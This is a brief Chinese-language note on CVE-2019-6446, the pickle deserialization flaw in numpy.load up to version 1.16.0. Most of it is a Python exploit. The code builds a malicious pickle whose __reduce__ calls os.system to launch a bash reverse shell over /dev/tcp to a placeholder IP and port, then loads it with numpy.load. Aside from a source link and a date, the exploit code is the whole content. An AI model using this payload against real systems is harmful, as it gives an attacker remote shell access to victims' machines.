# Numpy反序列化命令执行

CVE-2019-6446  
numpy 版本<=1.16.0才有漏洞, 漏洞在numpy.load  

```python
# 连到外面去

import os
import pickle

import numpy
from numpy import __version__
print(__version__)

class Payload(object):
    def __init__(self, ip, port):
        self.__ip = ip
        self.__port = port
    def __reduce__(self):
        code = 'bash -c "bash -i >& /dev/tcp/' + self.__ip + '/' + self.__port + ' 0<&1 2>&1"'
        # code = 'whoami'
        return (os.system,(code,))
payload = Payload('ip', 'port')
with open("payload",'wb') as f:
    pickle.dump(payload,f)

numpy.load('test-file.pickle')
```

源码获取: https://www.codercto.com/a/77458.html  


2019/11/1  
